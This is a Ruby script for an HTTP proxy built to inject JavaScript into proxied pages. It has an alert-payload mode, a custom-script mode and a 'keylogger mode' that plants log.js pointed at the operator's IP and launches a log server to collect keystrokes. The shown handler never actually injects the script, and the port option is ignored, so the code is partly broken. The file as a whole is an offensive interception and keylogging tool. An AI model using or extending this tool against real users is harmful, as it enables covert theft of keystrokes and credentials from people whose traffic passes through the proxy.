#!/usr/bin/ruby

require 'webrick'
require 'webrick/httpproxy'
load './modules/http_gzip.rb'

def opts(arg)
	case arg
	# Set port
		when '-p'
			$port = ARGV[ARGV.index(arg)+1]
	# Send a js file
		when '-j'
			$script = File.open(Dir.pwd+'/'+ARGV[ARGV.index(arg)+1]).read
	# Alert mode // must send variables, not strings. Integers ok.
		when '-a'
			$script = "alert(#{ARGV[ARGV.index(arg)+1]});"
	# Keylogger mode
		when '--keylogger'
			ip=Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
			@ip =  ip.ip_address if ip
			$script = File.open(Dir.pwd+'/modules/js/log.js').read.gsub('$URL$', @ip)
			logserver =`xterm -e 'ruby #{Dir.pwd}/modules/logserver.rb '&`
			quiet = `ruby #{Dir.pwd}/modules/logserver.rb &` if logserver.downcase.include? 'error'
	end
end
handler = proc do |req, res|
# Debugging, saving logs of req & res headers	
	File.open('req.header', 'a'){|f| f.puts Time.now, req.header; f.close}
	File.open('res.header', 'a'){|f| f.puts Time.now, res.header; f.close}
# -----------------------------------------------
  if res['content-encoding'] == 'gzip' then
    File.open('tmp.gz', 'w'){|f| f.puts res.body; f.close; gunzip}
    res['content-length'] = File.open('infile.gz').read.size
    res.body = File.open('infile.gz').read
  end
   
end
# Default port
$port = 8000
ARGV.each{|a| opts(a)}

proxy = WEBrick::HTTPProxyServer.new Port: 8000, ProxyContentHandler: handler

trap 'INT'  do proxy.shutdown end
trap 'TERM' do proxy.shutdown end


proxy.start

